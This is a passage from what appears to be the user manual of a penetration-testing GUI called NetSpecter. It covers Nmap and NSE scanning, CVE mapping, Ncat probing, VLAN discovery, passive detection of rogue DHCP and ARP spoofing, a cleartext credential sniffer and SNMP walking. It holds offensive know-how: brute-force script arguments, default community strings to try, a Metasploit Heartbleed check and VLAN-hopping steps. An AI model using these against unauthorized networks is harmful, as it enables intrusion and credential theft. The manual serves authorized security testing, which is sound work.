| `-sV` | Service version detection |
| `-sC` | Default NSE scripts |
| `-O` | OS fingerprint detection |
| `-p-` | All 65,535 ports |
| `-T4` | Aggressive timing (faster, but noisier) |
| `--open` | Only report open ports |

Scans all 65,535 ports with full fingerprinting. Captures OS detection, version detection, and script results. This is the most comprehensive scan type but also the slowest (can take 5-15 minutes per host depending on network conditions).

#### Nmap Standard Scan

Runs:

```bash
nmap -sS -sV -sC -O -T4 --open <target>
```

Scans the default top-1000 ports with aggressive detection flags. Identical to Deep Scan but without `-p-`, so it only checks the 1,000 most common ports. Recommended for first-pass enumeration — completes in 30-120 seconds per host.

#### Targeted Port Scan

Click any discovered open port tag in the Details panel while in Nmap mode. NetSpecter launches:

```bash
nmap -sV -sC -p <port> <target>
```

This runs a focused service version detection and default scripts against a single port. Useful for extracting detailed service information without the overhead of a full scan. For example, targeting port 443 will run SSL-related scripts that extract cipher suites, certificate details, and known TLS vulnerabilities.

#### Nmap Vuln Scan

Runs:

```bash
nmap --script vuln -p <open-ports> <target>
```

This triggers all NSE scripts in the `vuln` category against the host's known open ports. The output is parsed in real-time for CVE identifiers (see Section 8). This scan can take 5-30 minutes depending on the number of open ports and the scripts triggered.

#### How Results Are Streamed

Nmap output is captured via stdout streaming. As Nmap writes output lines, NetSpecter parses them in real-time:

1. Port discovery lines (`Discovered open port...`) immediately update the UI
2. Service detection results update the port's service label
3. NSE script output blocks are parsed for vulnerability findings
4. OS detection results update the host card's OS badge

The raw Nmap output is also displayed in a terminal block in the Host Details panel, so you can see exactly what Nmap is reporting.

#### Timing Options

Nmap T4 timing is used by default because it provides a good balance between speed and reliability on modern networks. The timing template affects:

- Probe timeout: 1.25 seconds (T4) vs. 5 seconds (T3/default)
- Max retries: 6 (T4) vs. 10 (T3)
- Parallelism: high (T4) vs. medium (T3)

> **Tip:** If you are scanning over a VPN or WAN link with high latency, scan results may be unreliable with T4. In such cases, use the NSE Explorer (Section 9) to run a custom scan with `-T3` timing.

#### Nmap XML Import Round-Trip

You can export scan results as Nmap XML and reimport them later:

1. Run a scan — results are saved to the configured XML output directory (Settings)
2. Close NetSpecter or start a new session
3. Use **Import Nmap XML** (Section 3) to reload the scan data
4. All hosts, ports, services, OS data, and vulnerability findings are restored

This enables a workflow where you scan a network, save the XML, and later load it on a different machine for analysis without needing network access to the targets.

---

## 8. Vulnerability Discovery & CVE Mapping

When you run the **Nmap Vuln Scan**, NetSpecter intercepts the raw terminal output buffer asynchronously:

- Searches for `VULNERABILITY:` blocks in the Nmap output stream
- Extracts the CVE identifier, CVSS severity score (Critical / High / Medium / Low), and description
- Dynamically generates links to `vulners.com` and `exploit-db.com` when public exploit PoCs are available
- Injects stylized vulnerability definition cards into the Host Details panel
- Updates the host card's security badge:
  - **Red flame + CVE count** — one or more CVEs found
  - **Green "Audited Secure"** — vuln scan completed with no findings

All discovered CVEs are cached in the host's `deepAudit` object and persisted when you save the session (see Section 20).

### CVSS Severity Bands

CVE findings are classified by their CVSS v3.0 base score:

| Severity | CVSS Range | Badge Color | Meaning |
| --- | --- | --- | --- |
| **Critical** | 9.0 - 10.0 | Dark red | Trivially exploitable, often leads to full system compromise |
| **High** | 7.0 - 8.9 | Red | Significant impact, likely exploitable with moderate effort |
| **Medium** | 4.0 - 6.9 | Orange | Moderate impact, may require specific conditions to exploit |
| **Low** | 0.1 - 3.9 | Yellow | Minor impact, difficult to exploit or limited consequences |

### How CVE Identifiers Are Extracted

NetSpecter parses the Nmap output using regex patterns that match:

- Standard CVE format: `CVE-YYYY-NNNNN` (e.g., `CVE-2021-44228`)
- Nmap `VULNERABLE` blocks that contain structured vulnerability output
- The CVSS score from the `scores` or `cvss` fields in NSE output

The parsed output is structured into finding objects with fields for CVE ID, title, CVSS score, description, and reference URLs.

### Reference Links

| Link Type | When Generated |
| --- | --- |
| **vulners.com** | Always generated for every CVE — provides aggregated vulnerability data |
| **exploit-db.com** | Generated when the NSE output mentions an exploit ID, or when the vulners entry indicates a public exploit is available |

> **Tip:** The presence of an exploit-db link means a proof-of-concept exploit exists in the wild. Prioritize these findings for immediate remediation.

### CVE Badge vs. Audited Secure Badge

| Badge | Condition |
| --- | --- |
| **Red flame + CVE count** | At least one CVE was discovered by the Nmap Vuln Scan |
| **Green "Audited Secure"** | The Nmap Vuln Scan completed successfully AND found zero CVEs |
| **No badge** | No vuln scan has been run on this host yet |

### Recommended CVE Workflow

1. Run the Nmap Vuln Scan on the target host
2. Review each CVE finding card — click to expand for full details
3. Look up the CVE in the National Vulnerability Database (NVD) for the official advisory
4. Cross-reference the affected software version with the service version detected by Nmap
5. Check exploit-db or Metasploit for available exploits (Section 16C)
6. Document the finding with evidence (Nmap output, service version, CVE description)

> **Worked example:** You run a vuln scan on a host with port 443 open. Nmap discovers `CVE-2014-0160` (Heartbleed) with CVSS 7.5 (High). The service version shows `OpenSSL/1.0.1e`. You verify the version is indeed vulnerable, then use the Metasploit module `auxiliary/scanner/ssl/openssl_heartbleed` to confirm exploitability, and document the finding for your report.

---

## 9. NSE Script Explorer

At the bottom of the Nmap actions list is the **NSE Explorer** dropdown. NetSpecter scans your filesystem to discover all installed `.nse` Lua scripts (600+) and presents them in a searchable, categorized selector.

### How Script Discovery Works

When you first open the NSE Explorer, NetSpecter searches for scripts in these locations:

1. **Nmap's default script directory:** Determined by running `nmap --datadir` or checking standard paths:
   - Linux: `/usr/share/nmap/scripts/`
   - macOS: `/usr/local/share/nmap/scripts/` or `/opt/homebrew/share/nmap/scripts/`
   - Windows: `C:\Program Files (x86)\Nmap\scripts\`
2. **Custom script directories:** Any `.nse` files in the Nmap data directory

Each script file is parsed for its metadata block (categories, description, author) to populate the UI.

### Using the NSE Explorer

1. Type in the search box to filter scripts (e.g., `smb-`, `http-`, `ssl-`)
2. Scripts are tagged with color-coded risk badges:
   - **Green "safe"** — passive information gathering
   - **Blue "discovery"** — active but benign probing
   - **Yellow "intrusive"** — may trigger logs or affect target state
   - **Red "vuln/exploit"** — active exploitation attempts
3. Select the script from the dropdown
4. Optionally add script arguments in the secondary input (e.g., `--script-args user=admin,pass=admin`)
5. Click **Run Custom Script** — output streams to the terminal block in the Details panel

### NSE Category Breakdown

| Category | Risk Level | Description | Notable Scripts |
| --- | --- | --- | --- |
| `safe` | Green | Read-only information gathering, no state changes | `http-title`, `ssh-hostkey`, `dns-nsid` |
| `discovery` | Blue | Active probing that should not cause harm | `http-enum`, `smb-os-discovery`, `snmp-info` |
| `version` | Blue | Service version detection helpers | `http-server-header`, `ssl-cert` |
| `default` | Blue | Scripts run with `-sC` | `http-title`, `ssh-hostkey`, `ssl-cert` |
| `auth` | Yellow | Authentication and credential testing | `http-brute`, `ftp-anon`, `ssh-brute` |
| `intrusive` | Yellow | May change target state or cause service disruption | `http-put`, `smb-psexec` |
| `vuln` | Red | Vulnerability detection and verification | `smb-vuln-ms17-010`, `ssl-heartbleed`, `http-vuln-cve2017-5638` |
| `exploit` | Red | Active exploitation attempts | `smb-vuln-ms08-067` (with exploit mode) |
| `brute` | Red | Brute-force credential attacks | `http-brute`, `ssh-brute`, `ftp-brute` |
| `dos` | Red | Denial of service testing | `smb-flood`, `http-slowloris` |
| `malware` | Red | Malware detection on target systems | `http-malware-host`, `smtp-strangeport` |

### Script Argument Format

Script arguments use the `key=value` format, separated by commas:

```bash
# Single argument
--script-args user=admin

# Multiple arguments
--script-args user=admin,pass=password,db=information_schema

# Complex arguments with dots (for script-specific namespaces)
--script-args http-brute.hostname=target.com,http-brute.path=/login
```

#### Common Script Argument Examples

| Script | Arguments | What It Does |
| --- | --- | --- |
| `http-brute` | `http-brute.path=/admin,http-brute.hostname=target.com` | Brute-force HTTP authentication at `/admin` |
| `smb-os-discovery` | *(none needed)* | Discovers OS, domain, and workgroup via SMB |
| `ssl-enum-ciphers` | *(none needed)* | Lists all supported TLS cipher suites with strength ratings |
| `http-sql-injection` | `http-sql-injection.url=/search?q=test` | Test a specific URL for SQL injection |
| `smb-enum-shares` | `smbuser=guest,smbpass=` | Enumerate shares with guest credentials |

### Reading NSE Output

NSE output is structured in blocks per script:

```text
PORT   STATE SERVICE
443/tcp open  https
| ssl-enum-ciphers:
|   TLSv1.0:
|     ciphers:
|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A
|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C
|     compressors:
|       NULL
|     cipher preference: server
|     warnings:
|       64-bit block cipher 3DES vulnerable to SWEET32 attack
|_  least strength: C
```

Each `|` line belongs to the script named on the first `|` line. Indentation shows hierarchy. Warnings and vulnerability findings are called out explicitly.

> **Dangerous scripts warning:** Scripts in the `exploit`, `dos`, and `brute` categories can cause service disruption, account lockouts, or system crashes. Never run these categories against targets without explicit written authorization. The `intrusive` category may trigger IDS/IPS alerts and should be used with awareness.

#### Worked Example: Discovering TLS Vulnerabilities

1. Select a host with port 443 open
2. In the NSE Explorer, search for `ssl-enum-ciphers`
3. Click **Run Custom Script**
4. Review the output: look for cipher suites rated **C** or **D** (weak), and any warnings about SWEET32, BEAST, or POODLE
5. If you see TLSv1.0 or TLSv1.1 listed, the server supports deprecated protocol versions
6. Document the findings: weak ciphers and deprecated protocols should be remediated by updating the server's TLS configuration

---

## 10. Interactive Ncat Sockets

The **Ncat** engine tab in the Host Details panel provides raw TCP/UDP socket connectivity directly from the GUI — no terminal window required.

### When to Use Ncat

| Scenario | Better Tool |
| --- | --- |
| Quick banner grab on a single port | **Ncat** — fastest, no setup needed |
| Full web application testing | **Proxy + Repeater** (Section 19A/19D) — better for HTTP workflows |
| Testing a raw TCP service (Redis, Memcached, custom protocol) | **Ncat** — direct socket access |
| Sustained interaction with a service | **Ncat** — bidirectional keep-alive |
| Automated payload sending | **Intruder** (Section 19E) — better for repeated requests |

### Using Ncat

1. Switch to the **Ncat** tab inside the Details panel
2. Enter the target **Port**
3. Select the protocol: **TCP** (default) or **UDP**
4. Fill the **Payload** field (e.g., `GET / HTTP/1.0\r\n\r\n` or any raw bytes)
5. Click **Connect & Send** — the stream stays open for bidirectional communication, visualizing raw byte exchanges in real time

### Example Payloads for Common Services

#### HTTP Banner Grab

```text
GET / HTTP/1.0\r\nHost: target.com\r\n\r\n
```

Returns the full HTTP response headers and body. Look at the `Server:` header for web server identification.

#### SMTP EHLO

```text
EHLO test\r\n
```

Returns the SMTP server's capability list. Look for `STARTTLS` (encryption support), `AUTH` methods, and the server banner for software identification.

#### FTP Login

```text
USER anonymous\r\nPASS anonymous@\r\n
```

Tests for anonymous FTP access. A `230` response means anonymous login is permitted.

#### Redis PING

```text
PING\r\n
```

If the server responds with `+PONG`, Redis is running and accepting unauthenticated connections — a critical finding.

#### Raw Binary Output

For services that return binary data (e.g., database protocols, custom TCP services), Ncat displays non-printable bytes as hex escapes. Look for ASCII strings embedded in the binary stream — these often contain version numbers, error messages, or protocol identifiers.

> **Worked example: Manual HTTP fingerprinting.** Target has port 8080 open. You suspect it's a management interface. Open Ncat, set port to 8080, enter `GET / HTTP/1.0\r\nHost: 192.168.1.42\r\n\r\n` as the payload. The response reveals `Server: Apache Tomcat/9.0.50` — now you know the exact software and version, which you can cross-reference with CVE databases.

---

## 11. VLAN Tag Discovery

NetSpecter integrates with `tshark` to passively listen for 802.1Q-tagged frames — useful for identifying misconfigured trunk ports or testing VLAN hopping defenses.

**Requirements:** tshark installed and enabled in Settings.

### What 802.1Q Tagging Is

IEEE 802.1Q is the standard for VLAN (Virtual LAN) tagging on Ethernet networks. A 4-byte tag is inserted into the Ethernet frame header containing a 12-bit VLAN ID (values 1-4094). Switches use this tag to determine which VLAN a frame belongs to.

On a properly configured network:
- **Access ports** (connecting to end devices) strip VLAN tags — frames arriving at your workstation should never be tagged
- **Trunk ports** (connecting switches to switches/routers) carry tagged frames for multiple VLANs

### Why This Matters for Pentesters

If you detect tagged frames on what should be an access port, it indicates one of:

- **Misconfigured trunk port** — the switch is sending you traffic from multiple VLANs, potentially giving you access to network segments you should not reach
- **DTP (Dynamic Trunking Protocol) negotiation** — the switch may be willing to negotiate a trunk, enabling a VLAN hopping attack
- **VLAN hopping opportunity** — by sending tagged frames yourself, you may be able to inject traffic into other VLANs

### Running VLAN Discovery

1. Click the **VLAN Discovery** button in the top control bar to open the VLAN panel
2. Select the physical network interface from the dropdown
3. Click **Start Capture**
4. NetSpecter runs a tshark capture filtered to VLAN-tagged packets
5. As tagged frames are detected, the UI extracts the **VLAN ID** and source/destination MAC addresses, appending them to the live results panel

The tshark filter used is:

```text
vlan
```

This captures any Ethernet frame containing an 802.1Q VLAN tag header.

### Interpreting Results

| VLAN ID Range | Typical Usage |
| --- | --- |
| **1** | Default/native VLAN (often untagged) — most common on misconfigured ports |
| **2-99** | Management, infrastructure, voice VLANs |
| **100-999** | User/department VLANs (varies by organization) |
| **1000-4094** | Service provider, special purpose VLANs |

### Legitimate vs. Suspicious Findings

| Finding | Likely Cause | Severity |
| --- | --- | --- |
| Tagged frames with your own VLAN ID | Normal trunk behavior if you're on a trunk port | Low (investigate why you're on a trunk) |
| Tagged frames with **multiple** different VLAN IDs | Trunk port — you can see traffic from other VLANs | High |
| Tagged frames with VLAN 1 (native) | Misconfigured trunk, possible VLAN hopping via double-tagging | Critical |
| No tagged frames detected | Access port is properly configured | Expected |

> **Worked example:** You start VLAN discovery on your `eth0` interface. After 30 seconds, frames appear with VLAN IDs 1, 10, and 50. This means you're connected to a trunk port carrying three VLANs. You can now craft 802.1Q-tagged frames to reach hosts on VLANs 10 and 50 that would normally be isolated from your segment — a significant network segmentation failure.

---

## 12. Passive Network Intelligence

The **Passive Intelligence** suite monitors the network silently using tshark. Click the **Passive Intelligence** button in the top toolbar to open the panel.

**Requirements:** tshark installed and enabled in Settings.

### Setup

1. Select your listening interface from the dropdown
2. Toggle the modules you want active (each module runs an independent tshark filter)
3. Click **Start Monitoring** — all selected modules start simultaneously

### Modules

#### DHCP Rogue Detection

Monitors DHCP OFFER and ACK messages. When an unknown DHCP server is detected offering IP addresses on your subnet, a high-severity alert card is immediately injected into the dashboard with the rogue server's MAC and IP.

##### What It Listens For

The module runs a tshark filter capturing DHCP (UDP ports 67-68) traffic, specifically:

- **DHCP OFFER** (message type 2) — sent by a server in response to a client's DISCOVER
- **DHCP ACK** (message type 5) — sent by a server confirming an IP lease

##### How "Unexpected Server" Is Determined

The first DHCP server IP seen is established as the baseline (assumed legitimate). Any subsequent DHCP response from a **different** source IP is flagged as a rogue server. The alert includes:

- Rogue server IP address
- Rogue server MAC address
- The IP address it was offering to clients
- Timestamp of detection

##### What a Rogue DHCP Alert Means

A rogue DHCP server can:

1. **Intercept all traffic** — by offering itself as the default gateway, it becomes a man-in-the-middle
2. **Redirect DNS** — by providing a malicious DNS server address, it can redirect victims to phishing sites
3. **Deny service** — by handing out invalid IP addresses or conflicting leases

##### Investigation Steps

1. Note the rogue server's MAC address from the alert
2. Search for this MAC in the dashboard — it may already be a discovered host
3. Use the vendor OUI to identify the device type
4. Physically locate the device if possible (trace the MAC through your switch's MAC address table)

> **False positive scenario:** A new legitimate DHCP server was intentionally added (e.g., a failover DHCP server, a DHCP relay, or a lab environment). Verify with the network administrator before treating as an incident.

#### Credential Sniffer

> **Legal Warning:** Activating this module captures cleartext credentials transmitted on your network. You must accept a legal disclaimer before first use. Only activate this on networks you are explicitly authorized to monitor. In many jurisdictions, unauthorized credential interception is a criminal offense regardless of whether the credentials are transmitted in cleartext. Ensure your engagement scope explicitly authorizes passive credential capture, and document this authorization before activating.

##### Exact Protocols Captured

| Protocol | Port(s) | What Is Extracted |
| --- | --- | --- |
| **FTP** | 21 | `USER` and `PASS` commands in plaintext |
| **HTTP Basic Auth** | 80, 8080 | `Authorization: Basic <base64>` header — decoded to `username:password` |
| **POP3** | 110 | `USER` and `PASS` commands |
| **IMAP** | 143 | `LOGIN username password` command |
| **Telnet** | 23 | Username and password prompt/response sequences |

##### Memory-Only Guarantee

Captured credentials are stored exclusively in the renderer's JavaScript memory. They are:

- **Never written to disk** — no log files, no database entries, no temp files
- **Never sent over IPC as persistent data** — the credential events flow from tshark through the main process to the renderer, but are never serialized to the electron-store or SQLite database
- **Destroyed when the app closes** — closing NetSpecter or stopping the passive capture module releases all captured credential data

> **Why this matters:** In a forensic context, having credentials stored on disk creates legal liability. The memory-only approach ensures that credentials exist only during active monitoring and cannot be recovered after the application is closed.

#### DNS Harvester

Monitors DNS and mDNS queries passively. Any host that announces itself through name resolution (even if it ignores ICMP pings) is automatically discovered and promoted to your main dashboard — no active probe required. Useful for finding IoT devices, printers, and Apple devices that suppress ICMP.

##### What DNS Query Types Are Captured

| Query Type | Description | Typical Sources |
| --- | --- | --- |
| **A** | IPv4 address lookups | All devices performing DNS resolution |
| **AAAA** | IPv6 address lookups | Dual-stack devices |
| **PTR** | Reverse DNS (IP to hostname) | Devices performing reverse lookups |
| **mDNS** | Multicast DNS (port 5353) | Apple Bonjour, Chromecast, smart home devices, network printers |

##### How "Stealth Hosts" Are Promoted

When the DNS Harvester sees a DNS query or response involving an IP address that is not currently in the dashboard:

1. The IP is extracted from the DNS answer section (A/AAAA records) or from the source IP of the query
2. The hostname is extracted from the query name
3. A new host entry is created with the IP and hostname
4. The host is added to the dashboard with a "DNS Discovery" source tag
5. Background probing runs automatically to check liveness and resolve vendor

##### mDNS Discovery Detail

Multicast DNS (mDNS, port 5353) is used by devices that need to advertise services on the local network without a central DNS server:

- **Apple devices:** iPhones, iPads, Macs, Apple TVs, HomePods (Bonjour protocol)
- **Chromecast / Google Home:** Cast protocol advertisements
- **Network printers:** IPP/AirPrint service advertisements
- **Smart home devices:** HomeKit, IoT hubs

These devices often disable ICMP responses but still announce themselves via mDNS, making the DNS Harvester the only way to discover them passively.

#### ARP Spoofing Detection

Monitors ARP replies for IP-to-MAC mapping conflicts. When an IP address is claimed by two different MAC addresses within a short window, or when gratuitous ARP announcements are detected, a Man-in-the-Middle alert fires immediately with the conflicting mappings shown side-by-side.

##### How the IP-to-MAC Baseline Is Built

The module maintains a table mapping each IP address to its MAC address. The first ARP reply seen for each IP establishes the baseline entry. Subsequent ARP replies for the same IP are compared against this baseline.

##### What "Gratuitous ARP" Is

A gratuitous ARP is an ARP reply sent without a preceding ARP request. It is used by devices to:

- Announce their presence on the network
- Update the ARP caches of other devices
- Claim an IP address

While gratuitous ARPs have legitimate uses (VRRP failover, IP conflict detection), they are also the primary mechanism used by ARP spoofing tools like `arpspoof`, `ettercap`, and `bettercap`.

##### Two Detection Patterns

1. **Conflicting MAC claims:** IP `192.168.1.1` was mapped to MAC `AA:BB:CC:DD:EE:FF`, but a new ARP reply claims it is `11:22:33:44:55:66`. This is the classic ARP poisoning signature.

2. **Unsolicited ARP announcements:** A gratuitous ARP is detected where a device claims an IP that already belongs to a different MAC. Even without conflicting entries, the unsolicited nature of the announcement is suspicious.

##### Response to an ARP Spoofing Alert

What it likely means:
- **MitM attack in progress** — an attacker is poisoning ARP caches to intercept traffic between two hosts (typically between victims and the gateway)
- **Or:** A VM adapter, VPN client, or Docker bridge is legitimately claiming an IP with a different virtual MAC address

##### False Positive Sources

| Source | Why It Triggers |
| --- | --- |
| **Docker/containers** | Docker bridge network creates virtual MACs that may overlap with host IPs |
| **Virtual machines** | VM network adapters use synthetic MACs |
| **VPN adapters** | VPN clients create virtual interfaces with new MAC addresses |
| **VRRP/HSRP failover** | Redundant routers share a virtual IP, and the active router changes |
| **DHCP lease changes** | A device releases and re-acquires an IP, potentially with a different NIC |

> **Tip:** If you see ARP spoofing alerts immediately after enabling the module, check whether any of the above false positive sources are present. True ARP spoofing typically shows a sustained pattern of conflicting claims for the **gateway** IP address.

#### Rogue DNS Detection

Establishes a baseline of trusted DNS responders by observing the first few DNS responses. If subsequent DNS replies originate from an unexpected server, or if conflicting A records are returned for the same hostname, a high-severity alert card is injected into the dashboard indicating potential DNS hijacking.

##### How the Trusted Resolver Baseline Is Established

The module observes the first 5 DNS response packets and records the source IPs. These are assumed to be the network's legitimate DNS resolvers (typically the gateway or a dedicated DNS server). After the baseline window, any DNS response from a source IP **not** in the trusted set triggers an alert.

##### What "Unexpected Responder" Means

If a DNS response comes from `192.168.1.99` but your baseline only includes `192.168.1.1` (the gateway), it means either:

1. A rogue DNS server is answering queries — potentially redirecting traffic to malicious IPs
2. A DNS proxy or forwarder has been added to the network
3. An attacker is running a DNS spoofing attack (e.g., `dnsspoof` from the `dsniff` suite)

##### Conflicting A Records

If the module sees two different A record answers for the same hostname from different servers, it is flagged as a high-severity finding. For example:

- Server `192.168.1.1` resolves `bank.com` to `93.184.216.34` (legitimate)
- Server `192.168.1.99` resolves `bank.com` to `10.0.0.5` (malicious)

This pattern strongly suggests DNS hijacking.

> **Recommended response:** Identify the rogue DNS responder by its IP and MAC address. Check if it is a known device on the network. If it is unknown, isolate it immediately and investigate.

### PCAP Export

At the bottom of the Passive Intelligence panel, click **Export PCAP...** to launch a targeted packet capture. Configure:

- Capture interface
- BPF filter (e.g., `host 192.168.1.5` or `tcp port 80`)
- Capture duration (seconds)
- Output file path

Click **Start Capture** — the panel streams packet summaries in real time. When complete (or when you click Stop), the `.pcap` file is saved and ready for offline analysis in Wireshark.

#### BPF Filter Syntax Reference

Berkeley Packet Filter (BPF) syntax is used for all capture filters:

| Filter | Captures |
| --- | --- |
| `host 192.168.1.5` | All traffic to/from a specific IP |
| `net 192.168.1.0/24` | All traffic within a subnet |
| `tcp port 80` | HTTP traffic only |
| `tcp port 443` | HTTPS traffic only |
| `udp port 53` | DNS queries and responses |
| `tcp port 80 or tcp port 443` | All web traffic |
| `host 192.168.1.5 and tcp port 22` | SSH traffic to/from a specific host |
| `ether host 00:1A:2B:3C:4D:5E` | All traffic from a specific MAC address |
| `not host 192.168.1.1` | Exclude gateway traffic |
| `tcp[tcpflags] & (tcp-syn) != 0` | Only TCP SYN packets (connection attempts) |
| `icmp` | ICMP only (pings, errors) |

#### What Happens During a Live Capture

While capturing, the panel shows:

- **Packet counter** — total packets captured so far
- **Size counter** — total bytes captured
- **Protocol summary** — running tally of protocols seen (TCP, UDP, ICMP, etc.)

The capture writes directly to a `.pcap` file on disk in real time. Even if you cancel the capture, all packets captured up to that point are saved.

#### Output File and Wireshark

The output file is saved in standard `.pcap` format (libpcap). To open in Wireshark:

1. Navigate to the file location shown in the export confirmation dialog
2. Double-click the `.pcap` file (if Wireshark is your default handler)
3. Or open Wireshark and use **File** then **Open** to browse to the file

> **Worked example:** You suspect a host is communicating with an external C2 server. Set a BPF filter of `host 192.168.1.42 and not net 192.168.1.0/24` to capture only traffic leaving the local subnet from that host. After 5 minutes, export the PCAP and open it in Wireshark. Use Wireshark's "Statistics > Conversations" to see which external IPs the host contacted.

---

## 13. SNMP Device Walking

NetSpecter supports SNMPv1, v2c, and v3 walking to extract detailed operational data from routers, switches, printers, and servers.

### When SNMP Is Useful

SNMP (Simple Network Management Protocol) is the standard protocol for monitoring and managing network devices. It is most valuable for:

- **Network devices** (routers, switches, firewalls) — reveals interface configurations, routing tables, ARP caches, firmware versions
- **Servers** — exposes CPU/memory usage, running processes, installed software
- **IoT devices** (printers, UPS systems, environmental monitors) — provides device status and configuration details
- **Managed switches** — reveals VLAN configurations, port status, MAC address tables

> **Tip:** SNMP is frequently overlooked during penetration tests, but it is one of the richest sources of network topology and configuration data. A single SNMP walk of a core router can reveal the entire network topology, including subnets and hosts you have not yet discovered.

### Version Selection Guidance

| Version | Authentication | Encryption | When to Try |
| --- | --- | --- | --- |
| **v1** | Community string (plaintext) | None | Legacy devices (10+ years old), IoT devices with minimal management stacks |
| **v2c** | Community string (plaintext) | None | Most common — default on the majority of network devices manufactured in the last 20 years |
| **v3** | USM (username/password) | Optional (DES, AES) | Modern, security-conscious environments. Requires credentials — try v2c first |

### Default Community Strings to Try

When testing v1/v2c, start with these community strings in order:

1. `public` — the most common read-only community string (factory default on nearly all devices)
2. `private` — the most common read-write community string
3. `community` — used by some vendors as an alternative default
4. Device-specific defaults: `ILMI` (ATM switches), `cable-docsis` (cable modems), `monitor` (some HP devices)

> **Security note:** If `private` (read-write) works, you have full management access to the device. This is a critical finding — document it immediately.

### Walking a Device

1. Click a host in the dashboard to open the **Host Details Panel**
2. In the **Actions** section, click **SNMP Walk**
3. Configure the walk parameters:
   - **Version**: v1, v2c, or v3
   - **Community String** (v1/v2c): typically `public` for read-only access
   - **Security Name / Auth / Privacy** (v3): USM credentials
   - **OID Prefix** (optional): scope the walk (e.g., `1.3.6.1.2.1.1` for system info only)
4. Click **Start Walk**

### Results

NetSpecter concurrently pulls and parses:

#### System Description (sysDescr — OID 1.3.6.1.2.1.1.1)

The system description string contains the device's self-reported identity. This typically includes firmware version, OS name, hardware model, and compilation date. Examples:

```text
Cisco IOS Software, C3750 Software (C3750-IPSERVICESK9-M), Version 15.0(2)SE11
Linux server01 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64
HP ETHERNET MULTI-ENVIRONMENT, ROM N.25.51, JETDIRECT, JD142
```

This single field often reveals the exact software version, which you can cross-reference with CVE databases.

#### Interface Statistics (ifTable — OID 1.3.6.1.2.1.2.2)

The interface table reveals every network interface on the device:

| Field | OID Suffix | What It Tells You |
| --- | --- | --- |
| ifDescr | .2 | Interface name (e.g., `GigabitEthernet0/1`, `eth0`, `Vlan10`) |
| ifType | .3 | Interface type (Ethernet, loopback, tunnel, VLAN) |
| ifSpeed | .5 | Link speed in bits/sec (1000000000 = 1 Gbps) |
| ifOperStatus | .8 | Current status: 1=up, 2=down, 3=testing |
| ifInOctets | .10 | Total bytes received (high count = active interface) |
| ifOutOctets | .16 | Total bytes sent (zero = unused/down interface) |

> **Interpretation tip:** Interfaces with zero byte counters are inactive. Interfaces with very high byte counts are heavily utilized — these are your core uplinks and trunk ports. VLAN interfaces (e.g., `Vlan10`, `Vlan20`) reveal the VLAN topology of the device.

#### IP Routing Table (ipRouteTable — OID 1.3.6.1.2.1.4.21)

The routing table reveals:

- **All subnets** the device knows about (destination networks)
- **Next-hop gateways** for each route
- **Route metrics** indicating preferred paths
- **Directly connected networks** (metric 0)

This is invaluable for mapping the network topology — you can discover subnets that are not in your current scope and identify the routing hierarchy.

#### ARP Cache (ipNetToMediaTable — OID 1.3.6.1.2.1.4.22)

The ARP cache of a router or switch reveals IP-to-MAC mappings for every host the device has communicated with recently. This is a host discovery bonus — hosts in the ARP cache that you have not yet scanned are new targets to investigate.

#### CPU / Memory MIBs (Vendor-Specific)

CPU and memory statistics use vendor-specific OIDs:

| Vendor | CPU OID Prefix | Memory OID Prefix |
| --- | --- | --- |
| Cisco | `1.3.6.1.4.1.9.9.109` (CISCO-PROCESS-MIB) | `1.3.6.1.4.1.9.9.48` (CISCO-MEMORY-POOL-MIB) |
| HP/Aruba | `1.3.6.1.4.1.11.2.14` | `1.3.6.1.4.1.11.2.14` |
| Juniper | `1.3.6.1.4.1.2636.3.1` | `1.3.6.1.4.1.2636.3.1` |
| Linux (Net-SNMP) | `1.3.6.1.4.1.2021.11` (UCD-SNMP-MIB) | `1.3.6.1.4.1.2021.4` |

### Expanding the OID Tree View

Results are grouped by OID category in an expandable tree view. Click any row to see the full OID path and raw value. Values may appear in different encodings:

- **STRING:** Human-readable text
- **INTEGER:** Numeric values (status codes, counters)
- **Counter32/Counter64:** Monotonically increasing counters (wrap at max value)
- **Hex-STRING:** Binary data displayed as hex bytes (commonly MAC addresses)
- **OID:** Object identifier reference to another MIB entry
- **Timeticks:** Uptime values in hundredths of a second

### Export / Copy Workflow

Select any section of the SNMP results and use the **Copy** button to copy the data to clipboard in a structured text format suitable for including in penetration test reports. The full OID tree can be copied as a single block.

> **Worked example:** You walk a Cisco switch at `192.168.1.1` with community string `public`. The sysDescr reveals `Cisco IOS 15.0(2)SE11`. The ifTable shows 48 GigabitEthernet ports plus VLAN interfaces for VLANs 1, 10, 20, and 100. The routing table reveals subnets `10.10.10.0/24` and `172.16.0.0/16` that you had not discovered yet. The ARP cache contains 15 IP-to-MAC mappings for hosts on VLAN 10 that you can now add to your target scope.

---

## 14. Network Topology Map

Transform the flat host grid into an interactive visual graph.

### How the Graph Is Built

The topology map constructs a network graph from multiple data sources:

1. **Scan data** — every discovered host becomes a node
2. **Gateway detection** — the default gateway (discovered via ARP or routing table data) is placed as a central hub
3. **Subnet inference** — hosts sharing the same `/24` subnet are grouped together
4. **Port-based classification** — hosts are classified by type based on their open ports (server, workstation, router, IoT)
5. **SNMP topology data** — if SNMP walks have been performed, routing tables and ARP caches provide explicit connectivity data

### Viewing the Topology

1. Discover hosts via the standard network scan
2. Click the **Topology** tab in the top navigation bar
3. Your network is rendered using Cytoscape.js with hosts clustered by subnet and linked to their detected gateways
4. Interact with the graph:
   - Click any node to open its Host Details panel
   - Use the **Layout** dropdown to switch between Force-Directed, Hierarchical, and Concentric layouts
   - Click the **Camera** icon to export the graph as a PNG
   - Use scroll-to-zoom and drag-to-pan to navigate large networks

### Layout Types

| Layout | Algorithm | Best For |
| --- | --- | --- |
| **Force-Directed** | Physics simulation (spring-force model) | General-purpose viewing. Naturally clusters densely connected nodes. Best starting point. |
| **Hierarchical** | Top-down tree layout | Seeing parent-child relationships: gateway at top, then switches/servers, then workstations at bottom. Reveals the network hierarchy. |
| **Concentric** | Rings by connectivity degree | Seeing centrality: nodes with the most connections are in the center ring. Reveals critical infrastructure (high-degree nodes = potential pivot points). |

### Node Types and Visual Distinction

Hosts are classified and styled based on their detected characteristics:

| Node Type | Visual Style | Detection Criteria |
| --- | --- | --- |
| **Router/Gateway** | Large diamond, blue border | Default gateway IP, or SNMP sysDescr containing "router"/"gateway" |
| **Server** | Square, red border | Multiple service ports open (SSH + HTTP + database) |
